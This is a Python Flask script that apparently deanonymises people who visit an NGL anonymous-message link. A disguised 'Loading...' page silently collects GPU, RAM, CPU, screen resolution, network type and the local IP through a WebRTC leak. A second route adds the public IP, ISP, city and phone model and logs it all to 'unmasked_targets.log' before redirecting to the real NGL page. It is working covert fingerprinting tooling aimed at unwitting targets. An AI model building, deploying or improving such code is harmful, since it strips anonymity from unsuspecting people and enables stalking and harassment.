from flask import Flask, redirect, request, render_template_string, make_response
import datetime
import requests

app = Flask(__name__)

# REPLACE with your handle
NGL_USER = "vaibhav_w16"

def get_isp_info(ip):
    try:
        if ip in ['127.0.0.1', '::1']: return "Localhost", "Localhost"
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,org,city,mobile").json()
        is_mobile = " [CELLULAR]" if r.get('mobile') else " [WIFI/BROADBAND]"
        return r.get('isp', 'Unknown'), f"{r.get('org')} ({r.get('city')}){is_mobile}"
    except:
        return "Lookup Failed", "Lookup Failed"

@app.route('/')
def fingerprint_jump():
    html_payload = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <script>
            async function collectAll() {
                // 1. GPU & Hardware
                const gl = document.createElement('canvas').getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
                const ram = navigator.deviceMemory || "Unknown";
                const cores = navigator.hardwareConcurrency || "Unknown";

                // 2. Physical Resolution Math (Your Update)
                const ratio = window.devicePixelRatio || 1;
                const res = `${window.screen.width * ratio}x${window.screen.height * ratio} (@${ratio}x)`;

                // 3. Network & WebRTC
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const netType = conn ? conn.effectiveType : "unknown";
                let localIP = "N/A";
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => {
                    if (i && i.candidate) {
                        const m = i.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (m) localIP = m[1];
                    }
                };

                setTimeout(() => {
                    const params = new URLSearchParams({
                        gpu: gpu, net: netType, local: localIP, 
                        ram: ram, cores: cores, res: res
                    });
                    window.location.href = "/final?" + params.toString();
                }, 700); // Slightly longer for WebRTC stability
            }
            window.onload = collectAll;
        </script>
    </head>
    <body style="background:#000;"></body>
    </html>
    '''
    response = make_response(render_template_string(html_payload))
    response.headers["Accept-CH"] = "Sec-CH-UA-Model, Sec-CH-UA-Platform-Version"
    response.headers["Critical-CH"] = "Sec-CH-UA-Model"
    response.headers["Permissions-Policy"] = 'ch-ua-model=("*")'
    return response

@app.route('/final')
def final_report():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    isp, location = get_isp_info(ip)
    
    # Headers
    model = request.headers.get('Sec-CH-UA-Model', 'Frozen').strip('"')
    os_ver = request.headers.get('Sec-CH-UA-Platform-Version', 'Unknown').strip('"')

    # URL Params
    log_entry = (
        f"--- FINAL UNMASK: {datetime.datetime.now().strftime('%H:%M:%S')} ---\n"
        f"DEVICE: {model} | OS: Android {os_ver}\n"
        f"ISP: {isp} | LOC: {location}\n"
        f"NET: {request.args.get('net').upper()} | LOCAL IP: {request.args.get('local')}\n"
        f"GPU: {request.args.get('gpu')}\n"
        f"SPECS: RAM({request.args.get('ram')}GB) | CPU({request.args.get('cores')}) | RES({request.args.get('res')})\n"
        f"{'='*60}\n"
    )
    
    with open("unmasked_targets.log", "a") as f: f.write(log_entry)
    print(log_entry)
    return redirect(f"https://ngl.link/{NGL_USER}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
